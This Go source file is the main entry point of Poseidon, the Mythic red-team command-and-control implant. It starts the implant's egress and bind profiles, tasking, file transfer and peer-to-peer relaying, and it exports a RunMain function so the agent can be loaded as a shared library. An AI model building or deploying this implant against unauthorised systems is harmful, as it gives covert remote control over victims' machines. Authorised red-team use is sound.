package main

import (
	"C"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/files"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/p2p"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/runtimeMainThread"
)

//export RunMain
func RunMain() {
	main()
}

func main() {
	// initialize egress and bind profiles - needs to send edges messages and alerts outside direct tasking
	profiles.Initialize()
	// initialize tasking related goroutines
	tasks.Initialize()
	// initialize responses to listen for messages going out to Mythic.
	// To prevent a circular dependency, we need to pass in profile's GetPushChannel function
	responses.Initialize(profiles.GetPushChannel)
	// start goroutines to listen for file transfer requests from tasks
	files.Initialize()
	// start goroutines to handle P2P for egress agents
	p2p.Initialize()
	// start running egress profiles
	go profiles.Start()
	runtimeMainThread.Main()
}
